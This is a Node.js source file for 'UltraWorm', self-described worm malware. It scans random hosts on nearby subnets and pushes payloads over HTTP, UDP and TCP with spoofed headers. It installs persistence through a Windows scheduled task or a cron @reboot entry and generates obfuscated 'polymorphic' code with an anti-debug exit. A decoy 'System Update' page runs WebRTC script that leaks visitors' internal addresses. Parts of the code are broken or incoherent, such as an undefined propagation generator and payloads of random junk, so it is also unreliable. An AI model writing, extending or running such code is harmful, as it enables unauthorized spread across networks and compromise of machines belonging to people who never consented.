const http = require('http');
const os = require('os');
const fs = require('fs').promises;
const crypto = require('crypto');
const { execSync } = require('child_process');
const dgram = require('dgram');
const net = require('net');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

class UltraWorm {
    constructor(port = 3000) {
        this.config = {
            infectionRadius: 10000,
            mutationRate: 0.4,
            payloadSize: 2048,
            decayTime: 3600000,
            scanSubnets: 5,
            maxWorkers: 4
        };

        this.state = {
            infectedHosts: new Set(),
            pendingInfections: new Map(),
            analytics: {
                propagationRate: 0,
                infectionVelocity: 0,
                failureTypes: new Map()
            }
        };

        this.port = port;
        this.initWormCore();
    }

    initWormCore() {
        this.selfHost = `${this.getLocalIP()}:${this.port}`;
        this.state.infectedHosts.add(this.selfHost);

        if (isMainThread) {
            this.server = http.createServer((req, res) => this.handleRequest(req, res));
            this.udpServer = dgram.createSocket('udp4');
            this.tcpServer = net.createServer();
            this.setupServers(this.port);
            this.installPersistence(); // Only main thread attempts persistence
        }

        this.loadPersistedInfections();
        this.activatePropagationEngine();
    }

    setupServers(port) {
        this.server.listen(port, () => 
            console.log(`[${new Date().toISOString()}] Worm active on ${this.selfHost}`));
        this.udpServer.on('message', (msg, rinfo) => this.handleDNSRequest(msg, rinfo));
        this.udpServer.bind(port + 1);
        this.tcpServer.on('connection', (socket) => this.handleP2PConnection(socket));
        this.tcpServer.listen(port + 2);
    }

    getLocalIP() {
        return Object.values(os.networkInterfaces())
            .flatMap(iface => iface.filter(addr => !addr.internal && addr.family === 'IPv4'))
            [0]?.address || '127.0.0.1';
    }

    async loadPersistedInfections() {
        try {
            const data = await fs.readFile('infected.bin');
            const hosts = new Set(data.toString().match(/\d+\.\d+\.\d+\.\d+:\d+/g));
            hosts.forEach(host => this.state.infectedHosts.add(host));
        } catch {
            await this.saveInfections();
        }
    }

    async saveInfections() {
        await fs.writeFile('infected.bin', [...this.state.infectedHosts].join('|'), 'binary');
    }

    async httpPropagate(targets) {
        const payload = this.generateFluidPayload(targets[0]);
        const promises = targets.map(target =>
            fetch(`http://${target}/infect`, {
                method: 'POST',
                body: payload,
                headers: this.generateDisguisedHeaders(),
                timeout: 100
            }).then(() => true).catch(() => false)
        );
        return (await Promise.all(promises)).some(Boolean);
    }

    async dnsPropagate(targets) {
        const payload = Buffer.from(this.generateFluidPayload(targets[0]));
        const client = dgram.createSocket('udp4');
        let success = false;
        for (const target of targets) {
            const [ip, port] = target.split(':');
            client.send(payload, Number(port) + 1, ip, (err) => {
                if (!err) success = true;
            });
        }
        client.close();
        return success;
    }

    async p2pPropagate(targets) {
        const payload = Buffer.from(this.generateFluidPayload(targets[0]));
        let success = false;
        await Promise.all(targets.map(target => new Promise((resolve) => {
            const [ip, port] = target.split(':');
            const socket = new net.Socket();
            socket.setTimeout(100);
            socket.connect(Number(port) + 2, ip, () => {
                socket.write(payload);
                success = true;
                socket.end();
                resolve();
            });
            socket.on('error', () => resolve());
            socket.on('timeout', () => socket.destroy());
        })));
        return success;
    }

    propagate = {
        methods: [this.httpPropagate.bind(this), this.dnsPropagate.bind(this), this.p2pPropagate.bind(this)],
        currentMethod: 0,
        rotateMethod: () => this.propagate.currentMethod = (this.propagate.currentMethod + 1) % this.propagate.methods.length
    };

    generateFluidPayload(target) {
        const junkCode = crypto.randomBytes(this.config.payloadSize).toString('hex');
        return JSON.stringify({ host: target, code: `(function(){${junkCode}/*${crypto.randomUUID()}*/})()` });
    }

    generateDisguisedHeaders() {
        return {
            'User-Agent': this.randomUserAgent(),
            'X-Forwarded-For': this.generateSpoofedIP(),
            'Referer': `https://${this.randomDomain()}/`,
            'Accept-Language': 'en-US,en;q=0.9'
        };
    }

    randomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    generateSpoofedIP() {
        return Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
    }

    randomDomain() {
        return `${crypto.randomBytes(4).toString('hex')}.com`;
    }

    activatePropagationEngine() {
        if (isMainThread) {
            const workers = [];
            for (let i = 0; i < this.config.maxWorkers; i++) {
                workers.push(new Worker(__filename, { workerData: { task: 'propagate' } }));
            }

            setInterval(() => this.networkRadar(workers), 5000);
            setInterval(() => this.propagate.rotateMethod(), 60000);
            setInterval(() => this.saveInfections(), 30000);

            setTimeout(() => {
                this.state.infectedHosts.clear();
                fs.unlink('infected.bin', () => {});
                workers.forEach(worker => worker.terminate());
                process.exit(0);
            }, this.config.decayTime);
        }
    }

    async networkRadar(workers) {
        const baseIP = this.getLocalIP().split('.').slice(0, 3).join('.');
        const targets = [];
        for (let subnet = 0; subnet < this.config.scanSubnets; subnet++) {
            const scanIP = `${baseIP}.${Math.floor(Math.random() * 254) + 1}`;
            targets.push(...Array.from({length: 254}, (_, i) => `${scanIP}.${i + 1}:${this.generateDynamicPort()}`));
        }
        const chunkSize = Math.ceil(targets.length / this.config.maxWorkers);
        const chunks = Array.from({ length: this.config.maxWorkers }, (_, i) => 
            targets.slice(i * chunkSize, (i + 1) * chunkSize)
        );

        if (isMainThread) {
            await Promise.all(chunks.map((chunk, i) => 
                new Promise((resolve) => {
                    workers[i].once('message', resolve);
                    workers[i].postMessage({ method: this.propagate.currentMethod, targets: chunk });
                })
            ));
        } else {
            parentPort.on('message', async ({ method, targets }) => {
                const result = await this.propagate.methods[method](targets);
                parentPort.postMessage(result);
            });
        }
    }

    generateDynamicPort() {
        return 3000 + Math.floor(Math.random() * 62000);
    }

    installPersistence() {
        try {
            if (process.platform === 'win32') {
                execSync(`schtasks /Create /TN "SystemUpdate" /SC MINUTE /TR "${process.argv[0]} ${__filename}"`);
            } else {
                execSync('command -v crontab', { stdio: 'ignore' });
                execSync(`(crontab -l 2>/dev/null; echo "@reboot ${process.argv[0]} ${__filename}") | crontab -`);
            }
        } catch {
            console.log('Persistence not installed: crontab unavailable or insufficient permissions');
        }
    }

    handleRequest(req, res) {
        const client = `${req.socket.remoteAddress}:${req.socket.remotePort}`;
        if (req.method === 'POST' && req.url === '/infect') {
            let data = '';
            req.on('data', chunk => data += chunk);
            req.on('end', () => {
                this.infectHost(JSON.parse(data).host);
                res.end();
            });
        } else if (req.url === '/payload') {
            res.end(this.generatePolymorphicCode());
        } else if (req.url === '/') {
            res.writeHead(200);
            res.end('OK');
        } else {
            res.end(this.generateDecoyPage(client));
        }
    }

    handleDNSRequest(msg, rinfo) {
        try {
            const host = JSON.parse(msg.toString()).host;
            this.infectHost(`${rinfo.address}:${rinfo.port}`); // Fixed template literal
        } catch (e) {
            console.log('Invalid DNS payload received');
        }
    }

    handleP2PConnection(socket) {
        socket.on('data', (data) => {
            const dataStr = data.toString();
            if (dataStr.startsWith('GET ') || dataStr.startsWith('POST ')) {
                socket.write('HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK');
                socket.end();
                return;
            }
            try {
                const host = JSON.parse(dataStr).host;
                this.infectHost(`${socket.remoteAddress}:${socket.remotePort}`);
            } catch (e) {
                console.log('Invalid P2P payload received');
            }
            socket.end();
        });
    }

    infectHost(host) {
        if (!this.state.infectedHosts.has(host)) {
            this.state.infectedHosts.add(host);
            if (isMainThread) this.networkRadar(); // Only main thread triggers radar
        }
    }

    generatePolymorphicCode() {
        const template = `
            const ${this.randomIdentifier()} = require('http');
            const ${this.randomIdentifier()} = require('child_process');
            ${this.generateJunkCode()}
            ${this.generatePropagationCode()}
            ${this.generateAntiDebug()}
        `;
        return this.obfuscateCode(template);
    }

    randomIdentifier() {
        return crypto.randomBytes(4).toString('hex');
    }

    generateJunkCode() {
        return Array.from({length: 5}, () => 
            `function ${this.randomIdentifier()}() { return "${crypto.randomBytes(8).toString('hex')}"; }`
        ).join('\n');
    }

    generateAntiDebug() {
        return `
            if (typeof process !== 'undefined' && process.env.NODE_OPTIONS?.includes('inspect')) {
                process.exit(0);
            }
        `;
    }

    obfuscateCode(code) {
        return code.split('').map(c => 
            Math.random() < this.config.mutationRate ? String.fromCharCode(c.charCodeAt(0) ^ 1) : c
        ).join('');
    }

    generateDecoyPage(client) {
        return `
            <!DOCTYPE html>
            <html>
            <head><title>System Update</title><script>${this.generateBrowserPropagation(client)}</script></head>
            <body><h1>Security Patches Installed</h1></body>
            </html>
        `;
    }

    generateBrowserPropagation(client) {
      const sanitizedClient = client.replace(/^::ffff:/, '');
      return `
        (function() {
          const pc = new RTCPeerConnection({
            iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
          });
          pc.createDataChannel('');
          pc.createOffer().then(offer => pc.setLocalDescription(offer));
          pc.onicecandidate = e => {
            if (e.candidate) {
              // Use window.location.origin to ensure correct protocol and host
              fetch(window.location.origin + '/infect', {
                method: 'POST',
                body: JSON.stringify({host: e.candidate.address}),
                mode: 'no-cors'
              }).catch(() => {});
            }
          };
        })();
      `;
    }


}

if (isMainThread) {
    if (require.main === module) {
        new UltraWorm(process.argv[2] || 3000);
    } else {
        module.exports = UltraWorm;
    }
} else {
    new UltraWorm(workerData.port || 3000); // Fallback port, though not used for servers
}